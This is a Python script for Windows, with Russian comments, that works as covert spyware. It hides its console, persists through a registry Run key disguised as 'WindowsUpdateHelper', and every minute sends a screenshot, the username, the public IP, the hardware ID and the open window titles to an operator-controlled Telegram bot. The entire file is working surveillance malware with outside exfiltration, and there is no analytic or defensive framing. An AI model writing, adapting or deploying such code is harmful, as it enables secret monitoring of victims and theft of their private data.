import ctypes
import pyautogui
import requests
import time
from datetime import datetime
import os
import getpass
import subprocess
import winreg
import sys

# Скрываем консоль
def hide_console():
    hwnd = ctypes.windll.kernel32.GetConsoleWindow()
    if hwnd:
        ctypes.windll.user32.ShowWindow(hwnd, 0)

hide_console()

BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'  # <-- вставь сюда токен твоего бота
CHAT_ID = 'YOUR_CHAT_ID_HERE'      # <-- вставь сюда свой chat_id

# Добавление в автозагрузку
def add_to_startup():
    script_path = os.path.realpath(sys.argv[0])
    key = winreg.HKEY_CURRENT_USER
    reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    name = "WindowsUpdateHelper"
    try:
        with winreg.OpenKey(key, reg_path, 0, winreg.KEY_ALL_ACCESS) as reg:
            try:
                existing, _ = winreg.QueryValueEx(reg, name)
                if existing == f'"{script_path}"':
                    return
            except FileNotFoundError:
                pass
        with winreg.OpenKey(key, reg_path, 0, winreg.KEY_SET_VALUE) as reg:
            winreg.SetValueEx(reg, name, 0, winreg.REG_SZ, f'"{script_path}"')
    except Exception:
        pass

add_to_startup()

def get_public_ip():
    try:
        return requests.get("https://api.ipify.org", timeout=5).text
    except:
        return "IP недоступен"

def get_username():
    return getpass.getuser()

def get_hwid():
    try:
        output = subprocess.check_output('wmic csproduct get uuid', shell=True).decode()
        lines = output.splitlines()
        uuid = [line.strip() for line in lines if line.strip() and "UUID" not in line]
        return uuid[0] if uuid else "HWID недоступен"
    except:
        return "HWID недоступен"

# Получение списка заголовков видимых окон
def get_open_window_titles():
    titles = []

    EnumWindows = ctypes.windll.user32.EnumWindows
    EnumWindowsProc = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_int, ctypes.c_int)
    GetWindowText = ctypes.windll.user32.GetWindowTextW
    GetWindowTextLength = ctypes.windll.user32.GetWindowTextLengthW
    IsWindowVisible = ctypes.windll.user32.IsWindowVisible

    def foreach_window(hwnd, lParam):
        if IsWindowVisible(hwnd):
            length = GetWindowTextLength(hwnd)
            if length > 0:
                buff = ctypes.create_unicode_buffer(length + 1)
                GetWindowText(hwnd, buff, length + 1)
                title = buff.value
                if title.strip():
                    titles.append(title.strip())
        return True

    EnumWindows(EnumWindowsProc(foreach_window), 0)
    return titles

def send_screenshot():
    try:
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        ip = get_public_ip()
        user = get_username()
        hwid = get_hwid()
        windows = get_open_window_titles()
        windows_text = "\n".join(windows) if windows else "Нет открытых окон"

        screenshot_path = 'screenshot.png'
        screenshot = pyautogui.screenshot()
        screenshot.save(screenshot_path)

        caption = (
            f"🖼️ Скриншот\n"
            f"🕒 {timestamp}\n"
            f"👤 Пользователь: {user}\n"
            f"🌐 IP: {ip}\n"
            f"💻 HWID: {hwid}\n\n"
            f"Открытые окна:\n{windows_text}"
        )

        with open(screenshot_path, 'rb') as photo:
            url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto'
            data = {'chat_id': CHAT_ID, 'caption': caption}
            files = {'photo': photo}
            requests.post(url, data=data, files=files)

        os.remove(screenshot_path)
    except:
        pass

while True:
    send_screenshot()
    time.sleep(60)
